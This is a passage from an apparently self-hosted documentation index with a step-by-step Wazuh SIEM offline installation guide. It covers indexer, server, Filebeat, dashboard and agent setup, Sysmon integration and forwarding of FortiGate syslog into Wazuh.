<li>For an all-in-one deployment, replace <code>\"&lt;indexer-node-ip&gt;\"</code>, <code>\"&lt;wazuh-manager-ip&gt;\"</code>, and <code>\"&lt;dashboard-node-ip&gt;\"</code> with <code>127.0.0.1</code>.</li> <li>For a distributed deployment, update the node names and IP addresses with the correct values for the Wazuh server, indexer, and dashboard. Add extra node fields as required.</li> </ul> <pre><code>nodes:\n  # Wazuh indexer nodes\n  indexer:\n    - name: node-1\n      ip: 10.0.0.20\n    #- name: node-2\n    #  ip: \"&lt;indexer-node-ip&gt;\"\n    #- name: node-3\n    #  ip: \"&lt;indexer-node-ip&gt;\"\n\n  # Wazuh server nodes\n  # If there is more than one Wazuh server\n  # node, each one must have a node_type\n  server:\n    - name: wazuh-1\n      ip: 10.0.0.20\n    #  node_type: master\n    #- name: wazuh-2\n    #  ip: \"&lt;wazuh-manager-ip&gt;\"\n    #  node_type: worker\n    #- name: wazuh-3\n    #  ip: \"&lt;wazuh-manager-ip&gt;\"\n    #  node_type: worker\n\n  # Wazuh dashboard nodes\n  dashboard:\n    - name: dashboard\n      ip: 10.0.0.20\n</code></pre> <p>Run the <code>./wazuh-install.sh -g</code> to generate the certificates. For a multi-node cluster, these certificates need to be later deployed to all Wazuh instances in your cluster.</p> <pre><code>./wazuh-install.sh -g\n</code></pre> <p>Transfer the following files to a directory on the host(s) where the offline installation will be performed. You can use <code>scp</code> for this:</p> <ul> <li><code>wazuh-install.sh</code></li> <li><code>wazuh-offline.tar.gz</code></li> <li><code>wazuh-install-files.tar</code></li> </ul>"},{"location":"wazuh/wazuh.html#installing-wazuh-components","title":"Installing Wazuh Components","text":"<p>In the working directory where you placed\u00a0<code>wazuh-offline.tar.gz</code>\u00a0and\u00a0<code>wazuh-install-files.tar</code>, execute the following command to decompress the installation files:</p> <pre><code>tar xf wazuh-offline.tar.gz\ntar xf wazuh-install-files.tar\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-the-wazuh-indexer","title":"Installing the Wazuh Indexer","text":"<p>RPM:</p> <p>The following dependencies must be installed on the Wazuh indexer nodes.</p> <ul> <li>coreutils</li> </ul> <pre><code>rpm --import ./wazuh-offline/wazuh-files/GPG-KEY-WAZUH\nrpm -ivh ./wazuh-offline/wazuh-packages/wazuh-indexer*.rpm\n</code></pre> <p>DEB:</p> <p>The following dependencies must be installed on the Wazuh indexer nodes.</p> <ul> <li>debconf</li> <li>adduser</li> <li>procps</li> </ul> <pre><code>dpkg -i ./wazuh-offline/wazuh-packages/wazuh-indexer*.deb\n</code></pre> <p>Run the following commands replacing\u00a0<code>&lt;indexer-node-name&gt;</code>\u00a0with the name of the Wazuh indexer node you are configuring as defined in\u00a0<code>config.yml</code>. For example,\u00a0<code>node-1</code>. This deploys the SSL certificates to encrypt communications between the Wazuh central components.</p> <p>On CentOS, if you encounter the error:</p> <pre><code>chmod: cannot access '/etc/wazuh-indexer/certs/*': No such file or directorty\n</code></pre> <p>Navigate to <code>/etc/wazuh-indexer/certs/</code> and run <code>chmod 400 *</code> as the root user.</p> <pre><code>NODE_NAME=&lt;INDEXER_NODE_NAME&gt;\n</code></pre> <pre><code>mkdir /etc/wazuh-indexer/certs\nmv -n wazuh-install-files/$NODE_NAME.pem /etc/wazuh-indexer/certs/indexer.pem\nmv -n wazuh-install-files/$NODE_NAME-key.pem /etc/wazuh-indexer/certs/indexer-key.pem\nmv wazuh-install-files/admin-key.pem /etc/wazuh-indexer/certs/\nmv wazuh-install-files/admin.pem /etc/wazuh-indexer/certs/\ncp wazuh-install-files/root-ca.pem /etc/wazuh-indexer/certs/\nchmod 500 /etc/wazuh-indexer/certs\nchmod 400 /etc/wazuh-indexer/certs/*\nchown -R wazuh-indexer:wazuh-indexer /etc/wazuh-indexer/certs\n</code></pre> <p>Move each node\u2019s certificate and key files (e.g., <code>node-1.pem</code> and <code>node-1-key.pem</code>) to their respective <code>certs</code> folder. These files are specific to each node and shouldn\u2019t be shared with others. However, do not move the <code>root-ca.pem</code> certificate\u2014copy it instead, so it can be deployed to other component folders later.</p> <p>Edit <code>/etc/wazuh-indexer/opensearch.yml</code> and modify the following settings:</p> <ol> <li><code>network.host</code> \u2013 Defines the node\u2019s address for HTTP and transport traffic. It should match the address used in <code>config.yml</code> when generating SSL certificates.</li> <li><code>node.name</code> \u2013 Set this to the Wazuh indexer node name as defined in <code>config.yml</code> (e.g., <code>node-1</code>).</li> <li><code>cluster.initial_master_nodes</code> \u2013 List the names of master-eligible nodes, as specified in <code>config.yml</code>.</li> </ol> <pre><code>network.host: \"10.0.0.20\"\nnode.name: \"node-1\"\ncluster.initial_master_nodes:\n- \"node-1\"\n#- \"node-2\"\n#- \"node-3\"\n</code></pre> <ol> <li><code>discovery.seed_hosts</code> \u2013 Contains the addresses of master-eligible nodes. Leave it commented for a single-node setup, but for multi-node configurations, uncomment it and specify the node addresses.</li> </ol> <pre><code>discovery.seed_hosts:\n  - \"10.0.0.1\"\n  - \"10.0.0.2\"\n  - \"10.0.0.3\"\n</code></pre> <ol> <li><code>plugins.security.nodes_dn</code> \u2013 Lists the Distinguished Names (DNs) of certificates for all Wazuh indexer cluster nodes. Uncomment and modify these based on your settings and <code>config.yml</code>.</li> </ol> <pre><code>plugins.security.nodes_dn:\n- \"CN=node-1,OU=Wazuh,O=Wazuh,L=California,C=US\"\n- \"CN=node-2,OU=Wazuh,O=Wazuh,L=California,C=US\"\n- \"CN=node-3,OU=Wazuh,O=Wazuh,L=California,C=US\"\n</code></pre> <p>Enable and start the Wazuh indexer service. Verify Wazuh indexer is active and running (exit with <code>q</code>)</p> <pre><code>systemctl daemon-reload\nsystemctl enable wazuh-indexer\nsystemctl start wazuh-indexer\nsystemctl status wazuh-indexer\n</code></pre> <p>Once all Wazuh indexer nodes are running, execute the <code>indexer-security-init.sh</code> script on any Wazuh indexer node. This updates the certificate information and initiates the cluster.</p> <pre><code>/usr/share/wazuh-indexer/bin/indexer-security-init.sh\n</code></pre> <p>Run the following command to check that the installation is successful. </p> <pre><code>curl -XGET https://10.0.0.20:9200 -u admin:admin -k\n</code></pre> <pre><code>#Example output\n{\n  \"name\" : \"node-1\",\n  \"cluster_name\" : \"wazuh-cluster\",\n  \"cluster_uuid\" : \"6hQpHd5cSzCLrhFo0T-Crg\",\n  \"version\" : {\n    \"number\" : \"7.10.2\",\n    \"build_type\" : \"rpm\",\n    \"build_hash\" : \"eee49cb340edc6c4d489bcd9324dda571fc8dc03\",\n    \"build_date\" : \"2023-09-20T23:54:29.889267151Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"9.7.0\",\n    \"minimum_wire_compatibility_version\" : \"7.10.0\",\n    \"minimum_index_compatibility_version\" : \"7.0.0\"\n  },\n  \"tagline\" : \"The OpenSearch Project: https://opensearch.org/\"\n}\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-the-wazuh-server","title":"Installing the Wazuh server","text":"<p>Run the following commands to import the Wazuh key and install the Wazuh manager.</p> <p>RPM:</p> <pre><code>rpm --import ./wazuh-offline/wazuh-files/GPG-KEY-WAZUH\nrpm -ivh ./wazuh-offline/wazuh-packages/wazuh-manager*.rpm\n</code></pre> <p>DEB:</p> <p>On systems with\u00a0apt\u00a0as package manager, the following dependencies must be installed on the Wazuh server nodes.</p> <ul> <li>gnupg</li> <li>apt-transport-https</li> </ul> <pre><code>dpkg -i ./wazuh-offline/wazuh-packages/wazuh-manager*.deb\n</code></pre> <p>Store the Wazuh indexer username and password in the Wazuh manager keystore using the <code>wazuh-keystore</code> tool.</p> <p>Note: The default credentials for an offline installation are admin:admin.</p> <pre><code>echo '&lt;INDEXER_USERNAME&gt;' | /var/ossec/bin/wazuh-keystore -f indexer -k username\necho '&lt;INDEXER_PASSWORD&gt;' | /var/ossec/bin/wazuh-keystore -f indexer -k password\n</code></pre> <p>Enable and start the Wazuh manager service. Verify Wazuh manager is active and running (exit with <code>q</code>)</p> <pre><code>systemctl daemon-reload\nsystemctl enable wazuh-manager\nsystemctl start wazuh-manager\nsystemctl status wazuh-manager\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-filebeat","title":"Installing Filebeat","text":"<p>Filebeat must be installed and configured on the same server as the Wazuh manager. Run the following command to install Filebeat.</p> <p>RPM:</p> <pre><code>rpm -ivh ./wazuh-offline/wazuh-packages/filebeat*.rpm\n</code></pre> <p>DEB:</p> <pre><code>dpkg -i ./wazuh-offline/wazuh-packages/filebeat*.deb\n</code></pre> <p>Copy the configuration files to the correct location. When prompted, type \"yes\" to overwrite <code>/etc/filebeat/filebeat.yml</code>.</p> <p>Note for CentOS: Remove <code>&amp;&amp;\\</code> from the command.</p> <pre><code>cp ./wazuh-offline/wazuh-files/filebeat.yml /etc/filebeat/ &amp;&amp;\\\ncp ./wazuh-offline/wazuh-files/wazuh-template.json /etc/filebeat/ &amp;&amp;\\\nchmod go+r /etc/filebeat/wazuh-template.json\n</code></pre> <p>Edit the\u00a0<code>/etc/filebeat/filebeat.yml</code>\u00a0configuration file and replace the following value:</p> <p><code>hosts</code>: The list of Wazuh indexer nodes to connect to. You can use either IP addresses or hostnames. By default, the host is set to localhost\u00a0<code>hosts:\u00a0[\"127.0.0.1:9200\"]</code>. Replace it with your Wazuh indexer address accordingly. </p> <p>If you have more than one Wazuh indexer node, you can separate the addresses using commas. For example,\u00a0<code>hosts:\u00a0[\"10.0.0.1:9200\",\u00a0\"10.0.0.2:9200\",\u00a0\"10.0.0.3:9200\"]</code></p> <pre><code># Wazuh - Filebeat configuration file\n output.elasticsearch:\n hosts: [\"10.0.0.20:9200\"]\n protocol: https\n username: ${username}\n password: ${password}\n</code></pre> <p>Create a Filebeat keystore to securely store authentication credentials.</p> <pre><code>filebeat keystore create\n</code></pre> <p>Add the username and password\u00a0<code>admin</code>:<code>admin</code>\u00a0to the secrets keystore.</p> <pre><code>echo admin | filebeat keystore add username --stdin --force\necho admin | filebeat keystore add password --stdin --force\n</code></pre> <p>Install the Wazuh module for Filebeat.</p> <pre><code>tar -xzf ./wazuh-offline/wazuh-files/wazuh-filebeat-0.4.tar.gz -C /usr/share/filebeat/module\n</code></pre> <p>Replace\u00a0<code>&lt;SERVER_NODE_NAME&gt;</code>\u00a0with your Wazuh server node certificate name, the same used in\u00a0<code>config.yml</code>\u00a0when creating the certificates. For example,\u00a0<code>wazuh-1</code>. Then, move the certificates to their corresponding location.</p> <p>On CentOS, if you encounter the error:</p> <pre><code>chmod: cannot access '/etc/filebeat/certs/*': No such file or directorty\n</code></pre> <p>Navigate to <code>/etc/filebeat/certs/</code> and run <code>chmod 400 *</code> as a root user</p> <pre><code>NODE_NAME=&lt;SERVER_NODE_NAME&gt;\n</code></pre> <pre><code>mkdir /etc/filebeat/certs\nmv -n wazuh-install-files/$NODE_NAME.pem /etc/filebeat/certs/filebeat.pem\nmv -n wazuh-install-files/$NODE_NAME-key.pem /etc/filebeat/certs/filebeat-key.pem\ncp wazuh-install-files/root-ca.pem /etc/filebeat/certs/\nchmod 500 /etc/filebeat/certs\nchmod 400 /etc/filebeat/certs/*\nchown -R root:root /etc/filebeat/certs\n</code></pre> <p>Enable and start the Filebeat service. Verify Filebeat is active and running (exit with <code>q</code>)</p> <pre><code>systemctl daemon-reload\nsystemctl enable filebeat\nsystemctl start filebeat\nsystemctl status filebeat\n</code></pre> <p>Run the following command to make sure Filebeat is successfully installed.</p> <pre><code>filebeat test output\n</code></pre> <pre><code>#Example output\nelasticsearch: https://10.0.0.20:9200...\n  parse url... OK\n  connection...\n    parse host... OK\n    dns lookup... OK\n    addresses: 10.0.0.20\n    dial up... OK\n  TLS...\n    security: server's certificate chain verification is enabled\n    handshake... OK\n    TLS version: TLSv1.3\n    dial up... OK\n  talk to server... OK\n  version: 7.10.2\n</code></pre> <p>Wazuh server node is now successfully installed.</p>"},{"location":"wazuh/wazuh.html#installing-the-wazuh-dashboard","title":"Installing the Wazuh Dashboard","text":"<p>RPM:</p> <p>The following dependencies must be installed on the Wazuh dashboard node.</p> <ul> <li>libcap</li> </ul> <pre><code>rpm --import ./wazuh-offline/wazuh-files/GPG-KEY-WAZUH\nrpm -ivh ./wazuh-offline/wazuh-packages/wazuh-dashboard*.rpm\n</code></pre> <p>DEB:</p> <p>The following dependencies must be installed on the Wazuh dashboard node.</p> <ul> <li>debhelper version 9 or later</li> <li>tar</li> <li>curl</li> <li>libcap2-bin</li> </ul> <pre><code>dpkg -i ./wazuh-offline/wazuh-packages/wazuh-dashboard*.deb\n</code></pre> <p>Replace\u00a0<code>&lt;DASHBOARD_NODE_NAME&gt;</code>\u00a0with your Wazuh dashboard node name, the same used in\u00a0<code>config.yml</code>\u00a0to create the certificates. For example,\u00a0<code>dashboard</code>. Then, move the certificates to their corresponding location.</p> <p>On CentOS, if you encounter the error:</p> <pre><code>chmod: cannot access '/etc/wazuh-dashboard/certs/*': No such file or directorty\n</code></pre> <p>Navigate to <code>/etc/wazuh-dashboard/certs/</code> and run <code>chmod 400 *</code> as a root user</p> <pre><code>NODE_NAME=&lt;DASHBOARD_NODE_NAME&gt;\n</code></pre> <pre><code>mkdir /etc/wazuh-dashboard/certs\nmv -n wazuh-install-files/$NODE_NAME.pem /etc/wazuh-dashboard/certs/dashboard.pem\nmv -n wazuh-install-files/$NODE_NAME-key.pem /etc/wazuh-dashboard/certs/dashboard-key.pem\ncp wazuh-install-files/root-ca.pem /etc/wazuh-dashboard/certs/\nchmod 500 /etc/wazuh-dashboard/certs\nchmod 400 /etc/wazuh-dashboard/certs/*\nchown -R wazuh-dashboard:wazuh-dashboard /etc/wazuh-dashboard/certs\n</code></pre> <p>Edit the\u00a0<code>/etc/wazuh-dashboard/opensearch_dashboards.yml</code>\u00a0file and replace the following values:</p> <ol> <li><code>server.host</code>: This setting specifies the host of the back end server. To allow remote users to connect, set the value to the IP address or DNS name of the Wazuh dashboard. The value\u00a0<code>0.0.0.0</code>\u00a0will accept all the available IP addresses of the host.</li> <li><code>opensearch.hosts</code>: The URLs of the Wazuh indexer instances to use for all your queries. The Wazuh dashboard can be configured to connect to multiple Wazuh indexer nodes in the same cluster. The addresses of the nodes can be separated by commas. For example,\u00a0<code>[\"https://10.0.0.2:9200\",\u00a0\"https://10.0.0.3:9200\",\"https://10.0.0.4:9200\"]</code></li> </ol> <pre><code>server.host: 10.0.0.20\nserver.port: 443\nopensearch.hosts: https://10.0.0.20:9200\nopensearch.ssl.verificationMode: certificate\n</code></pre> <p>Enable and start the Wazuh dashboard. Verify Wazuh dashboard is active and running (exit with <code>q</code>)</p> <pre><code>systemctl daemon-reload\nsystemctl enable wazuh-dashboard\nsystemctl start wazuh-dashboard\nsystemctl status wazuh-dashboard\n</code></pre> <p>Edit the file\u00a0<code>/usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml</code>\u00a0and replace the\u00a0<code>url</code>\u00a0value with the IP address or hostname of the Wazuh server master node.</p> <pre><code>hosts:\n  - default:\n      url: https://10.0.0.20\n      port: 55000\n      username: wazuh-wui\n      password: wazuh-wui\n      run_as: false\n</code></pre> <p>Access the web interface.</p> <ul> <li>URL:\u00a0https:// <li>Username: admin</li> <li>Password: admin</li> <p></p>"},{"location":"wazuh/wazuh.html#importing-certificate-optional","title":"Importing Certificate (Optional)","text":"<p>Upon the first access to the Wazuh dashboard, the browser shows a warning message stating that the certificate was not issued by a trusted authority. An exception can be added in the advanced options of the web browser or, for increased security, the\u00a0<code>root-ca.pem</code>\u00a0file previously generated can be imported to the certificate manager of the browser. </p> <p>Copy /etc/wazuh-dashboard/certs/root-ca.pem to user\u2019s home directory</p> <pre><code>cp /etc/wazuh-dashboard/certs/root-ca.pem ~/\n</code></pre> <p>Change ownership of user's home directory to the non-root user to enable read access to <code>root-ca.pem</code></p> <p>On Firefox, go to Settings, Privacy &amp; Security and Certificates. Click View Certificates.</p> <p></p> <p>Click Import, select <code>root-ca.pem</code> in user\u2019s home directory. Select Trust this CA to identify website and email users. Click OK.</p> <p></p> <p>Delete root-ca.pem from user\u2019s home directory.</p> <pre><code>sudo rm root-ca.pem\n</code></pre>"},{"location":"wazuh/wazuh.html#securing-wazuh-installation-optional","title":"Securing Wazuh Installation (Optional)","text":"<p>You have now installed and configured all the Wazuh central components. We recommend changing the default credentials to protect your infrastructure from possible attacks.</p> <p>Use the Wazuh passwords tool to change all the internal users passwords.</p> <pre><code>/usr/share/wazuh-indexer/plugins/opensearch-security/tools/wazuh-passwords-tool.sh --api --change-all --admin-user wazuh --admin-password wazuh\n</code></pre> <p>Save the new Wazuh indexer password into the Wazuh manager keystore. Restart Wazuh manager service.</p> <pre><code>/var/ossec/bin/wazuh-keystore -f indexer -k password -v &lt;SNIP&gt;\nsystemctl start wazuh-manager\nsystemctl status wazuh-manager\n</code></pre> <p>Add the new password to the Filebeat secrets keystore. Restart the Filebeat service</p> <pre><code>echo \"&lt;SNIP&gt;\" | filebeat keystore add password --stdin --force\nsystemctl restart filebeat\nfilebeat test output\n</code></pre> <p>Verify that new password has been added to /usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml. Restart the Wazuh dashboard.</p> <pre><code>nano /usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml\nsystemctl restart wazuh-dashboard\nsystemctl status wazuh-dashboard\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-wazuh-agents-on-endpoints","title":"Installing Wazuh Agents on Endpoints","text":""},{"location":"wazuh/wazuh.html#configuring-firewall-on-windows","title":"Configuring Firewall on Windows","text":"<p>For Wazuh agent to communicate with the Wazuh manager services, the following ports needs to be allowed for outbound connection:</p> <ul> <li>1514/TCP for agent communication.</li> <li>1515/TCP for enrollment via automatic agent request.</li> <li>55000/TCP for enrollment via manager API.</li> </ul> <p>Open Windows Defender Firewall with Advanced Security. Right-click Outbound Rules and create new rule. Select Port.</p> <p></p> <p>Select TCP and Specific remote ports. Put 1514, 1515, 55000. Click Next.</p> <p></p> <p>Select Allow the connection.</p> <p></p> <p>Select Domain, Private and Public.</p> <p></p> <p>Name the New Outbound Rule as Wazuh outbound and click Finish.</p> <p></p>"},{"location":"wazuh/wazuh.html#installing-wazuh-agent-on-windows","title":"Installing Wazuh agent on Windows","text":"<p>The agent runs on the endpoint you want to monitor and communicates with the Wazuh server, sending data in near real-time through an encrypted and authenticated channel.</p> <p>Note To perform the installation, administrator privileges are required.</p> <p>To start the installation process, download the\u00a0Windows installer.</p> <p>Open PowerShell as Administrator and change directory to where Windows installer is located. Run the following command:</p> <pre><code>.\\wazuh-agent-4.11.0-1.msi /q WAZUH_MANAGER=\"10.0.0.20\"\n</code></pre> <p>The installation process is now complete, and the Wazuh agent is successfully installed and configured. You can start the Wazuh agent from the GUI or by running:</p> <pre><code>NET START Wazuh\n</code></pre> <p>Once started, the Wazuh agent will start the enrollment process and register with the manager.</p>"},{"location":"wazuh/wazuh.html#troubleshooting-windows-wazuh-agent","title":"Troubleshooting Windows Wazuh Agent","text":"<p>If Wazuh agent on Windows is unable to connect to Wazuh server, open Wazuh Agent Manager</p> <p>If Authentication key show as , click Manage then Restart <p>Click Save then Refresh</p> <p></p> <p>You should be able to see Authentication key. The Authentication key is used to encrypt the traffic from the agent to the Wazuh server.</p> <p>If issues still persist, refer to the log file located at <code>C:\\Program Files (x86)\\ossec-agent\\ossec.log</code></p> <p>Alternatively, refer to the Troubleshooting guide.</p> <p></p> <p>On Wazuh web UI, go to Server management, then Endpoints Summary.</p> <p>Verify that the Windows agent is active.</p> <p></p>"},{"location":"wazuh/wazuh.html#sysmon-integration","title":"Sysmon Integration","text":"<p>Perform the steps below to install and configure Sysmon on the Windows endpoint.</p> <p>Download Sysmon from the\u00a0Microsoft Sysinternals page.</p> <p>Download the Sysmon configuration file:\u00a0sysmonconfig.xml. Note this is a modified version of sysmonconfig.xml recommended for integration with Wazuh. </p> <p>Install Sysmon with the downloaded configuration file using PowerShell as an administrator:</p> <pre><code>.\\sysmon64.exe -accepteula -i .\\sysmonconfig.xml\n</code></pre> <p>Open notepad as Administrator and open <code>ossec.conf</code>.</p> <p>Add the following configuration within the\u00a0<code>&lt;ossec_config&gt;</code>\u00a0block to the Wazuh agent\u00a0<code>C:\\Program\u00a0Files\u00a0(x86)\\ossec-agent\\ossec.conf</code>\u00a0file to specify the location to collect Sysmon logs:</p> <pre><code>&lt;localfile&gt;\n  &lt;location&gt;Microsoft-Windows-Sysmon/Operational&lt;/location&gt;\n  &lt;log_format&gt;eventchannel&lt;/log_format&gt;\n&lt;/localfile&gt;\n</code></pre> <p>Restart the Wazuh agent to apply the changes by running the following PowerShell command as an administrator:</p> <pre><code>Restart-Service -Name Wazuh\n</code></pre>"},{"location":"wazuh/wazuh.html#monitoring-network-devices-with-wazuh","title":"Monitoring Network Devices with Wazuh","text":""},{"location":"wazuh/wazuh.html#configuring-syslog-logging-on-fortigate","title":"Configuring Syslog Logging on FortiGate","text":"<p>On FortiGate Command-Line Interface (CLI), run the following commands to configure Syslog Server Settings:</p> <pre><code>config log syslogd setting\n    set status enable\n    set server &lt;syslog-ng IP&gt;\n    set source-ip &lt;FortiGate IP&gt;\n    # set port &lt;port number&gt;  (Default port is 514)\n    # Verify settings by running \"show\"\nend\n</code></pre> <p>Configure Log Memory Filter:</p> <pre><code>config log memory filter\n    set forward-traffic enable\n    set local-traffic enable\n    set sniffer-traffic disable\n    set anomaly enable\n    set voip disable\n    set multicast-traffic enable\n    # Verify settings by running \"show full-configuration\"\nend\n</code></pre> <p>Configure Global System Settings:</p> <pre><code>config system global\n    set cli-audit-log enable\n    # Verify settings by running \"show\"\n    # Ensure the timezone is correct, e.g., \"Pacific/Auckland\"\nend\n</code></pre> <p>Enable Logging for Neighbour Events:</p> <pre><code>config log setting\n    set neighbor-event enable\nend\n</code></pre>"},{"location":"wazuh/wazuh.html#configuring-log-rotation","title":"Configuring Log Rotation","text":"<p>By default, the <code>logrotate</code> service is configured to rotate logs in directories like <code>/var/log/</code></p> <p>For <code>rsyslog</code>, the rotation of its default log files (e.g., <code>/var/log/syslog</code>) is managed by the configuration file located at <code>/etc/logrotate.d/rsyslog</code>. Open the /etc/logrotate.d/rsyslog file in a text editor:</p> <pre><code>sudo nano /etc/logrotate.d/rsyslog\n</code></pre> <p>Add the path to your <code>fortigate.log</code> file under the existing log files. </p> <pre><code>/var/log/syslog\n/var/log/fortigate.log\n...\n{\n    rotate 4\n    weekly\n    missingok\n    notifempty\n    compress\n    delaycompress\n    sharedscripts\n    postrotate\n        /usr/lib/rsyslog/rsyslog-rotate\n    endscript\n}\n</code></pre> <p>Key Settings:</p> <ul> <li>rotate 4: Keeps 4 log files before deleting the oldest one.</li> <li>weekly: Rotates logs once per week.</li> <li>missingok: If the log file is missing, no error will be raised.</li> <li>notifempty: Only rotates logs if they are not empty.</li> <li>compress: Compresses old log files (e.g., to <code>.gz</code>).</li> <li>delaycompress: Compresses the logs on the second rotation cycle, meaning the most recent rotated file is not compressed immediately.</li> <li>sharedscripts: Runs the <code>postrotate</code> script only once, even if multiple logs are rotated.</li> <li>postrotate: After log rotation, it runs <code>/usr/lib/rsyslog/rsyslog-rotate</code> to ensure that <code>rsyslog</code> reopens its log files (so it doesn't keep writing to the old rotated file).</li> </ul>"},{"location":"wazuh/wazuh.html#configuring-syslog-on-wazuh-server-optional","title":"Configuring Syslog on Wazuh Server (Optional)","text":"<p>The Wazuh server can collect logs via syslog from endpoints such as firewalls, switches, routers, and other devices that don\u2019t support the installation of Wazuh agents. More details can be found here.</p> <p>If you have a central logging server like Syslog or Logstash in place, you can install the Wazuh agent on that server to streamline log collection. This setup enables seamless forwarding of logs from multiple sources to the Wazuh server, facilitating comprehensive analysis.</p>"},{"location":"wazuh/wazuh.html#configure-rsyslog-on-ubuntu-endpoint-recommended","title":"Configure Rsyslog on Ubuntu endpoint (Recommended)","text":"<p>Rsyslog\u00a0is a preinstalled utility in Ubuntu 22.04 for receiving syslog events. The following section shows the steps for enabling Rsyslog on the Ubuntu endpoint and configuring the Wazuh agent to send the syslog log data to the Wazuh server.</p> <p>Edit /etc/rsyslog.conf. </p> <pre><code>nano /etc/rsyslog.conf\n</code></pre> <p>Uncomment udp/514. Add allowed sender and configure log file format. Save changes.</p> <pre><code>#provides UDP syslog reception\nmodule(load=\u201dimudp\u201d)\ninput(type=\u201dimudp\u201d port=\u201d514\")\n\n#Add allowed sender and configure log file format\n$AllowedSender UDP, 10.0.0.1/24\n$template remote-incoming-logs, \"/var/log/%HOSTNAME%.log\"\n*.* ?remote-incoming-logs\n</code></pre> <p>Permit udp/514 through the firewall (if firewall is configured and enabled).</p> <pre><code>sudo ufw allow 514/udp\n</code></pre> <p>Edit permissions on <code>/var/log</code> as Rsyslog may encounter permission error on relaunch. </p> <pre><code>sudo chmod 775 /var/log\n</code></pre> <p>Add any hosts you are receiving logs from to <code>/etc/hosts</code></p> <pre><code>sudo nano /etc/hosts\n</code></pre> <pre><code>#Example output\n10.0.0.1    Fortigate\n</code></pre> <p>Restart and check status of rsyslog.</p> <pre><code>sudo systemctl restart rsyslog\nsystemctl status rsyslog\n</code></pre> <p>Configure the syslog clients (network devices) to send logs to our syslog server. Check <code>/var/log</code> to see that new log files are updating.</p> <pre><code>ls /var/log\ncat fortigate.log\n</code></pre> <pre><code>#Example output\n2024-09-13T08:13:46.806479+12:00 fortigate date=2024-09-12 time=15:44:50 devname=\"Fortigate\" devid=\"FGVMEVUEOETC5XC8\" eventtime=1726112689938988753 tz=\"+1200\" logid=\"0001000014\" type=\"traffic\" subtype=\"local\" level=\"notice\" vd=\"root\" srcip=192.168.1.64 srcport=14712 srcintf=\"root\" srcintfrole=\"undefined\" dstip=38.21.192.5 dstport=443 dstintf=\"port1\" dstintfrole=\"wan\" srccountry=\"Reserved\" dstcountry=\"United States\" sessionid=44992 proto=6 action=\"close\" policyid=0 service=\"HTTPS\" trandisp=\"noop\" app=\"HTTPS\" duration=1 sentbyte=441 rcvdbyte=223 sentpkt=5 rcvdpkt=4\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-wazuh-agent-on-linux-ubuntu","title":"Installing Wazuh agent on Linux (Ubuntu)","text":"<p>Configure firewall:</p> <pre><code>ufw allow 55000/tcp\nufw allow 1514/tcp\nufw allow 1515/tcp\n</code></pre> <p>Download Wazuh agent from the packages list.</p> <pre><code>https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-indexer/wazuh-indexer_4.11.0-1_amd64.deb\n</code></pre> <p>Transfer the Wazuh agent to Ubuntu endpoint. Install the package using <code>dpkg</code></p> <pre><code>dpkg -i wazuh-agent_4.11.0-1_amd64.deb\n</code></pre> <p>After installing, set the Wazuh manager's IP address by editing the configuration file. Look for the <code>&lt;server&gt;</code> section and update it with the Wazuh manager's IP address.</p> <pre><code>nano /var/ossec/etc/ossec.conf\n</code></pre> <pre><code>&lt;ossec_config&gt;\n  &lt;client&gt;\n    &lt;server&gt;\n      &lt;address&gt;10.0.0.20&lt;/address&gt;\n      &lt;port&gt;1514&lt;/port&gt;\n      &lt;protocol&gt;tcp&lt;/protocol&gt;\n    &lt;/server&gt;\n    &lt;config-profile&gt;ubuntu, ubuntu22, ubuntu22.04&lt;/config-profile&gt;\n    &lt;notify_time&gt;10&lt;/notify_time&gt;\n    &lt;time-reconnect&gt;60&lt;/time-reconnect&gt;\n    &lt;auto_restart&gt;yes&lt;/auto_restart&gt;\n    &lt;crypto_method&gt;aes&lt;/crypto_method&gt;\n  &lt;/client&gt;\n</code></pre> <p>Start and enable the Wazuh agent. Verify Wazuh agent is active and running.</p> <pre><code>systemctl start wazuh-agent\nsystemctl enable wazuh-agent\nsystemctl status wazuh-agent\n</code></pre> <p>On Wazuh server UI, verify Ubuntu agent is active</p> <p></p>"},{"location":"wazuh/wazuh.html#configuring-wazuh-to-monitor-fortigate-log","title":"Configuring Wazuh to Monitor Fortigate Log","text":"<p>Add the following to <code>/var/ossec/etc/ossec.conf</code> file on Wazuh manager and agent.</p> <pre><code>#On both Wazuh manager and agent\n&lt;localfile&gt;\n  &lt;log_format&gt;syslog&lt;/log_format&gt;\n  &lt;location&gt;/var/log/fortigate.log&lt;/location&gt;\n&lt;/localfile&gt;\n</code></pre> <p>Restart the manager and agent after adding this setting:</p> <pre><code>systemctl restart wazuh-manager\nsystemctl restart wazuh-agent\n</code></pre> <p>Verify fortigate logs are being ingested. Follow the steps below to enable archiving and set up wazuh-archives-* index. Search wazuh-alerts- and wazuh-archives- index. Add filter for location is <code>/var/log/fortigate.log</code>.</p> <p></p> <p></p>"},{"location":"wazuh/wazuh.html#default-decoders-and-rules-for-fortigate","title":"Default Decoders and Rules for FortiGate","text":"<p>By default, Wazuh has pre-installed decoders and rules for FortiGate. This can be checked in Wazuh server UI under Rules and Decoders</p> <p></p> <p></p> <p>To test the default rule for FortiGate, SSH brute force attack was executed from Kali machine.</p> <p>The alert from the rule \u201cFortigate: Multiple high traffic events from same source\u201d was generated.</p> <p>This can be verified in Threat Intelligent, Events section on the web UI. </p> <p></p>"},{"location":"wazuh/wazuh.html#event-logging","title":"Event Logging","text":""},{"location":"wazuh/wazuh.html#log-compression-and-rotation","title":"Log Compression and Rotation","text":"<p>Log files can quickly accumulate and consume significant disk space in a system. To prevent this, the Wazuh manager compresses logs during its rotation process, helping to manage disk usage efficiently and maintain system performance. The Wazuh manager compresses log files daily or when they reach a certain threshold (file size, age, time, and more) and archives them. In the log rotation process, Wazuh creates a new log file with the original name to continuously write new events.</p> <p>Log files are compressed daily and digitally signed using MD5, SHA1, and SHA256 hashing algorithms. The compressed log files are stored in the\u00a0<code>/var/ossec/logs/</code>\u00a0directory</p>"},{"location":"wazuh/wazuh.html#archiving-event-logs","title":"Archiving Event Logs","text":"<p>Events are logs generated by applications, endpoints, and network devices. The Wazuh server stores all events it receives, whether or not they trigger 